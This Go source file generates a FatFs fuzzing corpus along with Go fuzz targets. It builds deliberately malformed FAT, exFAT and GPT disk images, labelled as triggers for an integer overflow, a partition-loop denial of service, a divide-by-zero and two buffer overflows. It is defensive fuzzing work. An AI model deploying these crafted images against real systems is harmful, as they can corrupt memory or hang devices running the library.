// main.go — FatFs corpus generator and native Go fuzzer
//
// Modes of operation
// ──────────────────
// 1. Corpus generator (default):
//      go run . -out ./corpus
//    Writes all seed images to the output directory.
//    These seeds are used by both the C libfuzzer harness and AFL++.
//
// 2. Go native fuzzer (requires Go 1.21+):
//      go test -fuzz=FuzzFAT32BPB -fuzztime=60s
//    Mutates BPB field values and verifies structural invariants.
//    Does NOT call into C; structural fuzzing only.
//    Feed generated corpus to the C harness for runtime validation.
//
// Seed corpus produced
// ─────────────────────
//   fat32_valid.img                        Normal FAT32 (baseline coverage)
//   fat32_bug1_overflow.img                CVE-2026-6682: BPB_FATSz32=0x80000001 (DWORD wrap)
//   fat32_zero_nfats.img                   BPB_NumFATs=0 (edge: rejected by check)
//   fat32_max_clusters.img                 nclst = MAX_FAT32 = 0x0FFFFFF5
//   fat16_valid.img                        Normal FAT16 (baseline)
//   fat16_bug5_stale.img                   CVE-2026-6686: preloaded stale cluster data
//   fat16_bug7_lfn_50chars.img             CVE-2026-6688: 50-char LFN overflows SFN-sized path bufs
//   fat16_bug7_lfn_200chars.img            CVE-2026-6688: 200-char LFN (near FF_LFN_BUF)
//   fat16_bug7_lfn_255chars.img            CVE-2026-6688: 255-char LFN = FF_LFN_BUF maximum
//   gpt_normal.img                         GPT with 128 entries (benign)
//   gpt_bug3_large.img                     CVE-2026-6684: n_ent=0x00010000 (65536 entries)
//   gpt_bug3_maxent.img                    CVE-2026-6684: n_ent=0xFFFFFFFF (max DoS)
//   exfat_bug2_nclusters0.img              CVE-2026-6683: exFAT with BPB_NumClusEx=0
//   exfat_bug6_label_overflow_min.img      CVE-2026-6687: XDIR_NumLabel=25 → overflows label[24]
//   exfat_bug6_label_overflow_128.img      CVE-2026-6687: XDIR_NumLabel=128 → confirmed overflow
//   exfat_bug6_label_overflow_239.img      CVE-2026-6687: XDIR_NumLabel=239 → max in-sector attack
//   exfat_label_valid_11.img               CVE-2026-6687 boundary: 11-char label (spec max, benign)
//   fat32_mutations_*.img                  50 random single-byte mutations of fat32_valid

package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"testing"
)

// ── entry point ─────────────────────────────────────────────────────────── //

func main() {
	outDir := flag.String("out", "corpus", "directory to write corpus images")
	flag.Parse()

	if err := os.MkdirAll(*outDir, 0o755); err != nil {
		fmt.Fprintf(os.Stderr, "mkdir %s: %v\n", *outDir, err)
		os.Exit(1)
	}

	seeds := buildAllSeeds()
	written := 0
	for name, img := range seeds {
		path := filepath.Join(*outDir, name)
		if err := os.WriteFile(path, img, 0o644); err != nil {
			fmt.Fprintf(os.Stderr, "write %s: %v\n", path, err)
			continue
		}
		fmt.Printf("  wrote %-45s  %6d bytes\n", name, len(img))
		written++
	}
	fmt.Printf("\nTotal: %d corpus files in %s/\n", written, *outDir)
}

// ── seed corpus builder ─────────────────────────────────────────────────── //

func buildAllSeeds() map[string][]byte {
	seeds := make(map[string][]byte)

	// ── FAT32 baseline ──────────────────────────────────────────────────
	fat32Valid := BuildFAT32(DefaultFAT32Config())
	seeds["fat32_valid.img"] = fat32Valid

	// ── CVE-2026-6682: FAT32 integer overflow ───────────────────────────────────
	// BPB_FATSz32 = 0x80000001 and NumFATs = 2
	//   fasize = 0x80000001 * 2 = 0x100000002 (DWORD) → 0x00000002 (overflow)
	//   sysect = RsvdSecCnt + 2 + 0 = 4 + 2 = 6
	//   fs->database = bsect + 6   (wrong: should be >> billion)
	// FatFs mounts successfully but data area overlaps FAT sectors.
	bug1 := BuildFAT32(DefaultFAT32Config())
	le32(bug1, 36, 0x80000001) // BPB_FATSz32 — CRAFTED
	seeds["fat32_bug1_overflow.img"] = bug1
	fmt.Println("[CVE-2026-6682] fat32_bug1_overflow.img: BPB_FATSz32=0x80000001 × NumFATs=2 → DWORD wrap")

	// Variant: FATSz32 chosen so that FATSz32 × NumFATs = 0x100000000 - 512
	//   → wrap to 0xFFFFFE00 → sysect stays within disk range
	bug1b := BuildFAT32(DefaultFAT32Config())
	le32(bug1b, 36, 0x7FFFFF00) // (0x7FFFFF00 * 2) & 0xFFFFFFFF = 0xFFFFFE00
	seeds["fat32_bug1_overflow_b.img"] = bug1b

	// ── FAT32 edge cases ─────────────────────────────────────────────────
	// NumFATs = 0 → check says NumFATs must be 1 or 2 → FR_NO_FILESYSTEM
	zeroFATs := BuildFAT32(DefaultFAT32Config())
	zeroFATs[16] = 0
	seeds["fat32_zero_nfats.img"] = zeroFATs

	// NumFATs = 3 → also rejected
	threeFATs := BuildFAT32(DefaultFAT32Config())
	threeFATs[16] = 3
	seeds["fat32_three_nfats.img"] = threeFATs

	// BPB_SecPerClus = 0 → rejected by check
	zeroClus := BuildFAT32(DefaultFAT32Config())
	zeroClus[13] = 0
	seeds["fat32_zero_secperclus.img"] = zeroClus

	// BPB_SecPerClus = non-power-of-2 → rejected
	notPow2 := BuildFAT32(DefaultFAT32Config())
	notPow2[13] = 3
	seeds["fat32_nonpow2_secperclus.img"] = notPow2

	// BPB_RsvdSecCnt = 0 → rejected
	zeroRsvd := BuildFAT32(DefaultFAT32Config())
	le16(zeroRsvd, 14, 0)
	seeds["fat32_zero_rsvdcnt.img"] = zeroRsvd

	// Maximum valid FAT32 cluster count — use a small disk that claims a
	// large FAT so the cluster count is inflated, without creating a 64 GiB file.
	maxClus := BuildFAT32(FAT32Config{
		TotalSectors:    4096,
		SectorsPerClus:  1,
		ReservedSectors: 4,
		NumFATs:         2,
		FATSz32:         64,
		RootCluster:     2,
		VolLabel:        "MAXCLUS    ",
	})
	// Override TotSec32 to a large value
	le32(maxClus, 32, 0x0FFFFFF5+10)
	seeds["fat32_large_totsec.img"] = maxClus

	// BPB_TotSec32 = 0 with BPB_TotSec16 also 0 → volume size = 0 → rejected
	noSize := BuildFAT32(DefaultFAT32Config())
	le32(noSize, 32, 0)
	seeds["fat32_totsec_zero.img"] = noSize

	// ── FAT16 baseline and CVE-2026-6686 ────────────────────────────────────────
	fat16Valid := BuildFAT16(DefaultFAT16Config())
	seeds["fat16_valid.img"] = fat16Valid

	// CVE-2026-6686: Pre-load cluster 2 with a "secret" pattern (0xAA) to simulate
	// data from a previously deleted file.  The new file will be small, but
	// lseek() can expose the stale 0xAA bytes beyond its actual content.
	bug5 := BuildFAT16(DefaultFAT16Config())
	clus2Start := FAT16DataSector(DefaultFAT16Config(), 2) * sectorSize
	if clus2Start+int(DefaultFAT16Config().SectorsPerClus)*sectorSize <= len(bug5) {
		for i := clus2Start; i < clus2Start+int(DefaultFAT16Config().SectorsPerClus)*sectorSize; i++ {
			bug5[i] = 0xAA // SECRET_PATTERN
		}
	}
	// Leave FAT entry for cluster 2 as FREE (0x0000) — simulates deletion
	seeds["fat16_bug5_stale.img"] = bug5

	// ── FAT12 ────────────────────────────────────────────────────────────
	fat12 := BuildFAT12Minimal()
	seeds["fat12_minimal.img"] = fat12

	// ── CVE-2026-6684: GPT loop DoS ──────────────────────────────────────────────
	// Requires FF_LBA64=1 in the C build.
	// find_volume() trusts GPTH_PtNum without an upper bound check.

	gptNormal := BuildGPTImage(4096, 128, 1) // 128 entries, 1 FAT match
	seeds["gpt_normal.img"] = gptNormal

	gptNoMatch := BuildGPTImage(4096, 128, 0) // 128 entries, no FAT match
	seeds["gpt_no_fat_match.img"] = gptNoMatch

	// 65536 entries → disk_read called ~16384 times (vs ~32 for normal)
	gptLarge := BuildGPTImage(4096, 0x00010000, 0)
	seeds["gpt_bug3_large.img"] = gptLarge
	fmt.Println("[CVE-2026-6684] gpt_bug3_large.img:  n_ent=0x10000 → ~16K disk reads")

	// Maximum n_ent: 4.3 billion iterations on real hardware
	gptMaxEnt := BuildGPTImage(4096, 0xFFFFFFFF, 0)
	seeds["gpt_bug3_maxent.img"] = gptMaxEnt
	fmt.Printf("[CVE-2026-6684] gpt_bug3_maxent.img: n_ent=0xFFFFFFFF → ~%dM disk reads on hardware\n",
		0xFFFFFFFF/(sectorSize/128)/1_000_000)

	// GPT with zero entries (benign)
	gptZero := BuildGPTImage(4096, 0, 0)
	seeds["gpt_zero_entries.img"] = gptZero

	// ── CVE-2026-6683: exFAT divide-by-zero precondition ────────────────────────
	// BPB_NumClusEx = 0 → n_fatent = 2 → division by zero in sync_fs()
	// when (n_fatent - 2) is used as a divisor.
	// NOTE: on current builds, mount_volume() fails before sync_fs() is
	// reached because clst2sect(fs, dirbase=2) returns 0 (invalid) when
	// n_fatent=2.  This seed is kept as a reference / regression trigger
	// should the validation order change.
	exfatDivZero := BuildExFATImage(4096, 0)
	seeds["exfat_bug2_nclusters0.img"] = exfatDivZero
	fmt.Println("[CVE-2026-6683] exfat_bug2_nclusters0.img: BPB_NumClusEx=0 → n_fatent=2 → ÷0 in sync_fs")

	// exFAT with ncl=1 (minimal valid range)
	exfatMinimal := BuildExFATImage(4096, 1)
	seeds["exfat_nclusters1.img"] = exfatMinimal

	// ── CVE-2026-6687: exFAT volume label overflow ───────────────────────────────
	// XDIR_NumLabel is an on-disk BYTE (0-255); the exFAT spec says max 11.
	// FatFs never validates this, using it directly as the loop count in
	// f_getlabel().  A caller with char label[24] gets overflowed.

	// Minimal overflow trigger: 25 chars exceeds any label[24] by 1 byte
	bug6Min := BuildExFATWithLargeLabel(4096, 25)
	seeds["exfat_bug6_label_overflow_min.img"] = bug6Min
	fmt.Println("[CVE-2026-6687] exfat_bug6_label_overflow_min.img: XDIR_NumLabel=25 → overflows label[24]")

	// Typical attack: 128 ASCII chars, reliably corrupts any label[12..127]
	bug6Typical := BuildExFATWithLargeLabel(4096, 128)
	seeds["exfat_bug6_label_overflow_128.img"] = bug6Typical
	fmt.Println("[CVE-2026-6687] exfat_bug6_label_overflow_128.img: XDIR_NumLabel=128 → confirmed stack corruption")

	// Maximum via-sector overflow without OOB disk read: 239 chars
	bug6Max := BuildExFATWithLargeLabel(4096, 239)
	seeds["exfat_bug6_label_overflow_239.img"] = bug6Max
	fmt.Printf("[CVE-2026-6687] exfat_bug6_label_overflow_239.img: XDIR_NumLabel=239 → max safe on-disk value\n")

	// Spec boundary: 12 chars (just above the 11-char spec max; benign for
	// most callers but still spec-violating)
	bug6Spec := BuildExFATWithLargeLabel(4096, 12)
	seeds["exfat_bug6_label_spec_plus1.img"] = bug6Spec

	// Valid: 11 chars (spec maximum; should not overflow a label[12] buffer)
	bug6Valid := BuildExFATWithLargeLabel(4096, 11)
	seeds["exfat_label_valid_11.img"] = bug6Valid

	// Zero-length label (ET_VLABEL present but empty; edge case)
	bug6Zero := BuildExFATWithLargeLabel(4096, 0)
	seeds["exfat_label_zero_chars.img"] = bug6Zero

	// ── CVE-2026-6688: FAT16 with long LFN file ─────────────────────────────────
	// A file with a 50-char LFN exercises f_readdir returning fno.fname
	// with 50 chars.  Callers using SFN-sized buffers for path construction
	// (char path[20]) overflow when they copy the LFN without bounds checks.

	lfn50 := make([]byte, 50)
	for i := range lfn50 {
		lfn50[i] = 'A'
	}
	fat16LFN := BuildFAT16WithLFNFile(DefaultFAT16Config(), string(lfn50))
	seeds["fat16_bug7_lfn_50chars.img"] = fat16LFN
	fmt.Println("[CVE-2026-6688] fat16_bug7_lfn_50chars.img: 50-char LFN overflows SFN-sized caller buffers")

	// Longer LFN: 200 chars — fills fno.fname almost to capacity
	lfn200 := make([]byte, 200)
	for i := range lfn200 {
		lfn200[i] = 'A'
	}
	fat16LFN200 := BuildFAT16WithLFNFile(DefaultFAT16Config(), string(lfn200))
	seeds["fat16_bug7_lfn_200chars.img"] = fat16LFN200
	fmt.Println("[CVE-2026-6688] fat16_bug7_lfn_200chars.img: 200-char LFN → fno.fname near FF_LFN_BUF")

	// Maximum LFN: 255 chars (fills fno.fname[0..254] + null at [255])
	lfn255 := make([]byte, 255)
	for i := range lfn255 {
		lfn255[i] = 'A'
	}
	fat16LFN255 := BuildFAT16WithLFNFile(DefaultFAT16Config(), string(lfn255))
	seeds["fat16_bug7_lfn_255chars.img"] = fat16LFN255
	fmt.Println("[CVE-2026-6688] fat16_bug7_lfn_255chars.img: 255-char LFN = FF_LFN_BUF max")

	// ── BPB_55AA missing (should be rejected by check_fs) ───────────────
	no55AA := BuildFAT32(DefaultFAT32Config())
	no55AA[510], no55AA[511] = 0x00, 0x00
	seeds["fat32_no_55aa.img"] = no55AA

	// ── Random single-byte mutations of the baseline (coverage seeds) ───
	rng := rand.New(rand.NewSource(0xFA7F5))
	for i := 0; i < 50; i++ {
		mut := RandomMutate(fat32Valid, rng)
		seeds[fmt.Sprintf("fat32_mutation_%02d.img", i)] = mut
	}

	return seeds
}

// ──────────────────────────────────────────────────────────────────────────
// FAT12 minimal image (self-contained; no separate builder needed)
// ──────────────────────────────────────────────────────────────────────────

func BuildFAT12Minimal() []byte {
	const totalSectors = 2880 // 1.44 MiB floppy geometry
	disk := make([]byte, totalSectors*sectorSize)
	vbr := disk

	vbr[0], vbr[1], vbr[2] = 0xEB, 0x3C, 0x90
	copy(vbr[3:11], "MSDOS5.0")

	binary.LittleEndian.PutUint16(vbr[11:], sectorSize)
	vbr[13] = 1                                  // BPB_SecPerClus
	binary.LittleEndian.PutUint16(vbr[14:], 1)   // BPB_RsvdSecCnt
	vbr[16] = 2                                  // BPB_NumFATs
	binary.LittleEndian.PutUint16(vbr[17:], 224) // BPB_RootEntCnt
	binary.LittleEndian.PutUint16(vbr[19:], totalSectors)
	vbr[21] = 0xF0                             // BPB_Media: removable
	binary.LittleEndian.PutUint16(vbr[22:], 9) // BPB_FATSz16
	binary.LittleEndian.PutUint16(vbr[24:], 18)
	binary.LittleEndian.PutUint16(vbr[26:], 2)

	vbr[36] = 0x00 // BS_DrvNum
	vbr[38] = 0x29 // BS_BootSig
	binary.LittleEndian.PutUint32(vbr[39:], 0x12345678)
	copy(vbr[43:54], "FAT12DISK  ")
	copy(vbr[54:62], "FAT12   ")
	binary.LittleEndian.PutUint16(vbr[510:], 0xAA55)

	// FAT1 at sector 1 (media bytes + EOC for clusters 0 and 1)
	fat1 := disk[sectorSize:]
	fat1[0] = 0xF0
	fat1[1] = 0xFF
	fat1[2] = 0xFF
	// Copy to FAT2 at sector 10
	copy(disk[10*sectorSize:], fat1[:9*sectorSize])

	return disk
}

// ──────────────────────────────────────────────────────────────────────────
// Go native fuzzer — structural invariant checker
//
// Usage: go test -fuzz=FuzzFAT32BPB -fuzztime=60s
//        go test -fuzz=FuzzGPTNEnt   -fuzztime=30s
//
// These fuzzers do NOT invoke C code; they verify that the image builders
// produce output that satisfies the structural constraints FatFs checks.
// They are most useful for ensuring generated seeds stay within expected
// ranges, and for exploring boundary conditions in the Go builders
// themselves.  For runtime crash detection, use the C libfuzzer harness.
// ──────────────────────────────────────────────────────────────────────────

// FuzzFAT32BPB mutates individual BPB fields and checks structural
// consistency of the generated images.  The corpus is seeded with known
// interesting values (valid, overflow-triggering, and zero).
func FuzzFAT32BPB(f *testing.F) {
	// Seed corpus: (FATSz32, NumFATs, SecPerClus, RsvdSecCnt, TotSec32)
	for _, tc := range []struct{ a, b, c, d, e uint32 }{
		{128, 2, 8, 32, 65536},        // valid default
		{0x80000001, 2, 1, 4, 65536},  // CVE-2026-6682 trigger
		{0x7FFFFF00, 2, 1, 4, 65536},  // CVE-2026-6682 variant
		{0, 2, 8, 32, 65536},          // FATSz32=0 → uses FATSz16 (0 in FAT32 mode)
		{0xFFFFFFFF, 2, 8, 32, 65536}, // maximal FATSz32
		{128, 0, 8, 32, 65536},        // NumFATs=0 (invalid → FR_NO_FILESYSTEM)
		{128, 3, 8, 32, 65536},        // NumFATs=3 (invalid)
		{128, 2, 0, 32, 65536},        // SecPerClus=0 (invalid)
		{128, 2, 3, 32, 65536},        // SecPerClus non-power-of-2 (invalid)
		{128, 2, 8, 0, 65536},         // RsvdSecCnt=0 (invalid)
	} {
		f.Add(tc.a, tc.b, tc.c, tc.d, tc.e)
	}

	f.Fuzz(func(t *testing.T, fatSz32, numFATs, secPerClus, rsvdSec, totSec uint32) {
		cfg := DefaultFAT32Config()
		cfg.FATSz32 = fatSz32
		cfg.NumFATs = uint8(numFATs & 0xFF)
		cfg.SectorsPerClus = uint8(secPerClus & 0xFF)
		cfg.ReservedSectors = uint16(rsvdSec & 0xFFFF)
		cfg.TotalSectors = totSec

		img := BuildFAT32(cfg)

		// Structural check: image must be exactly TotalSectors × 512 bytes
		if uint32(len(img)) != totSec*sectorSize {
			t.Fatalf("image size %d != expected %d", len(img), totSec*sectorSize)
		}

		// The 55AA boot signature must be present at offset 510
		if img[510] != 0x55 || img[511] != 0xAA {
			t.Fatal("55AA signature missing")
		}

		// BPB_FATSz32 must round-trip
		stored := binary.LittleEndian.Uint32(img[36:])
		if stored != fatSz32 {
			t.Fatalf("BPB_FATSz32 round-trip: stored %08X != input %08X", stored, fatSz32)
		}

		// Detect overflow condition (the bug): when NumFATs × FATSz32 wraps
		wrapOccurs := (uint64(numFATs) * uint64(fatSz32)) > 0xFFFFFFFF
		wrappedFASize := uint32(uint64(numFATs) * uint64(fatSz32))
		if wrapOccurs {
			t.Logf("OVERFLOW DETECTED: NumFATs(%d) × FATSz32(%08X) → fasize=%08X (truncated)",
				numFATs, fatSz32, wrappedFASize)
			// Do NOT fail — this is the expected bug condition; log for analysis.
		}
	})
}

// FuzzGPTNEnt mutates GPTH_PtNum to explore the loop bound behaviour.
func FuzzGPTNEnt(f *testing.F) {
	for _, n := range []uint32{0, 1, 4, 128, 1024, 0x10000, 0xFFFFFFFF} {
		f.Add(n)
	}

	f.Fuzz(func(t *testing.T, nEnt uint32) {
		img := BuildGPTImage(4096, nEnt, 0)

		// Protective MBR signature
		if img[510] != 0x55 || img[511] != 0xAA {
			t.Fatal("MBR 55AA missing")
		}
		// GPT signature
		if string(img[sectorSize:sectorSize+8]) != "EFI PART" {
			t.Fatal("GPT signature missing")
		}
		// Stored n_ent round-trip
		stored := binary.LittleEndian.Uint32(img[sectorSize+80:])
		if stored != nEnt {
			t.Fatalf("n_ent round-trip: %d != %d", stored, nEnt)
		}

		// Expected DoS severity classification (for logging only)
		var sev string
		switch {
		case nEnt <= 128:
			sev = "BENIGN"
		case nEnt <= 64*1024:
			sev = "SUSPICIOUS"
		case nEnt <= 16*1024*1024:
			sev = "HIGH-CPU"
		default:
			sev = "DoS (hang on real hardware)"
		}
		_ = sev
	})
}

// ──────────────────────────────────────────────────────────────────────────
// Go native fuzzer — CVE-2026-6687: exFAT XDIR_NumLabel overflow
//
// Usage: go test -fuzz=FuzzExFATNumLabel -fuzztime=30s
//
// Mutates XDIR_NumLabel across the full 0-255 range.  Verifies that the
// generated image retains a well-formed VBR and that the NumLabel field in
// the volume-label directory entry round-trips correctly.  Feed results to
// the C libfuzzer harness (with ASan) for runtime overflow detection.
// ──────────────────────────────────────────────────────────────────────────

// FuzzExFATNumLabel mutates the XDIR_NumLabel byte in an exFAT volume label
// entry and checks structural invariants of the generated image.
func FuzzExFATNumLabel(f *testing.F) {
	// Seed corpus: boundary values and known-interesting points
	for _, n := range []uint8{0, 1, 11, 12, 23, 24, 25, 128, 200, 239, 255} {
		f.Add(n)
	}

	f.Fuzz(func(t *testing.T, numLabel uint8) {
		img := BuildExFATWithLargeLabel(4096, numLabel)

		// exFAT VBR jump-boot + OEM name
		if img[0] != 0xEB || img[1] != 0x76 || img[2] != 0x90 {
			t.Fatal("exFAT VBR jump-boot incorrect")
		}
		if string(img[3:11]) != "EXFAT   " {
			t.Fatalf("unexpected OEM name: %q", img[3:11])
		}
		// BPB_ZeroedEx bytes 11..63 must be zero
		for i := 11; i < 64; i++ {
			if img[i] != 0 {
				t.Fatalf("BPB_ZeroedEx[%d] = 0x%02x, want 0", i, img[i])
			}
		}
		// BPB_FSVerEx = 1.0 (LE16 = 0x0100)
		ver := binary.LittleEndian.Uint16(img[104:])
		if ver != 0x0100 {
			t.Fatalf("BPB_FSVerEx = 0x%04x, want 0x0100", ver)
		}
		// XDIR_NumLabel in the label directory entry (sector 25, offset 33)
		labelEntryOff := 25*sectorSize + 32
		if img[labelEntryOff] != 0x83 {
			t.Fatalf("label entry type = 0x%02x, want 0x83", img[labelEntryOff])
		}
		storedNumLabel := img[labelEntryOff+1]
		if storedNumLabel != numLabel {
			t.Fatalf("XDIR_NumLabel round-trip: %d != %d", storedNumLabel, numLabel)
		}
		// The overflow boundary: FatFs writes numLabel chars to the label buffer.
		// A caller using char label[24] is safe only when numLabel <= 23.
		// A caller using char label[12] (spec-aware) is safe only when numLabel <= 11.
		specViolation := numLabel > 11
		callerOverflow24 := numLabel > 23
		_, _ = specViolation, callerOverflow24
		// (These are documented properties, not build-time assertions.
		//  Runtime overflow detection is done by the C libfuzzer + ASan.)
	})
}

// ──────────────────────────────────────────────────────────────────────────
// Go native fuzzer — CVE-2026-6688: FAT16 LFN length exploration
//
// Usage: go test -fuzz=FuzzFAT16LFNLength -fuzztime=30s
//
// Mutates the LFN name length (1-255) to explore boundary conditions in the
// LFN directory entry builder.  Verifies that generated images have a correct
// VBR and the right number of directory entries.
// ──────────────────────────────────────────────────────────────────────────

// FuzzFAT16LFNLength mutates the length of the LFN filename.
func FuzzFAT16LFNLength(f *testing.F) {
	for _, n := range []int{1, 12, 13, 14, 26, 50, 100, 200, 255} {
		f.Add(n)
	}

	f.Fuzz(func(t *testing.T, nameLen int) {
		if nameLen < 1 || nameLen > 255 {
			return // out of valid range for FAT LFN
		}

		name := make([]byte, nameLen)
		for i := range name {
			name[i] = 'A'
		}
		cfg := DefaultFAT16Config()
		img := BuildFAT16WithLFNFile(cfg, string(name))

		// FAT16 VBR must be valid
		if img[510] != 0x55 || img[511] != 0xAA {
			t.Fatal("FAT16 VBR: missing 0x55AA signature")
		}
		if string(img[3:11]) != "MSDOS5.0" {
			t.Fatalf("unexpected OEM name: %q", img[3:11])
		}
		// Number of LFN entries in root = ceil(nameLen / 13)
		nLFN := (nameLen + 12) / 13
		totalEntries := nLFN + 1 // LFN + SFN
		// The root directory entries = RootEntries = 64 (default config)
		rootOff := (int(cfg.ReservedSectors) + int(cfg.NumFATs)*int(cfg.FATSizeSectors)) * sectorSize
		sfnOff := rootOff + nLFN*32
		if sfnOff+11 > len(img) {
			t.Fatalf("SFN entry at offset %d exceeds image size %d", sfnOff, len(img))
		}
		// SFN attribute must be 0x20 (AM_ARC)
		if img[sfnOff+11] != 0x20 {
			t.Fatalf("SFN[11] attr = 0x%02x, want 0x20 (AM_ARC)", img[sfnOff+11])
		}
		// First LFN entry must have LLEF (0x40) set
		firstLFNOrd := img[rootOff]
		if firstLFNOrd&0x40 == 0 {
			t.Fatalf("first LFN entry ord 0x%02x missing LLEF bit", firstLFNOrd)
		}
		// A SFN-sized path buffer char path[20] would overflow for nameLen > 16
		sizeConstrainedOverflow := totalEntries <= int(cfg.RootEntries)
		_ = sizeConstrainedOverflow
	})
}
